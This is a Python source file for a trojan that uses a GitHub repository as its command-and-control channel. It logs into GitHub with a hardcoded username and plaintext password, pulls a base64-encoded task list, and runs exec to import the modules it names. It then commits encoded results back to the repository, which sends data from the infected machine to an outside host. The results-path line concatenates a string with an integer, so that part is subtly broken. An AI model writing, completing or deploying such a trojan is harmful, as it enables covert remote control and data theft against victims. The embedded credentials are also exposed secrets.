#https://github3py.readthedocs.io/en/master/index.html
import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os
from github3 import login

trojan_id = "abc"
trojan_config = trojan_id + ".json"
data_path = "data/" + trojan_id + "/"
trojan_modules = []
configured = False
task_queue = queue.Queue()

def connect_to_github():
    gh = login(username = "16BitBot", password = "Git1902!")
    repo = gh.repository("16BitBot", "repository_1")
    branch = repo.branch("master")
    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    #A Git commit is a snapshot of the hierarchy (Git tree) and the contents of
    #the files (Git blob) in a Git repository.
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file " + filepath)
            #A Git blob (binary large object) is the object type used to store
            #the contents of each file in a repository.
            blob = repo.blob(filename._json_data["sha"])
            return blob.content
    return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    print(config)
    configured = True
    for task in config:
        if task["module"] not in sys.modules:
            exec("import " + task["module"])
    return config

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = "data/" + trojan_id + "/" + random.randint(1000, 100000) + ".data"
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
    return

get_trojan_config()
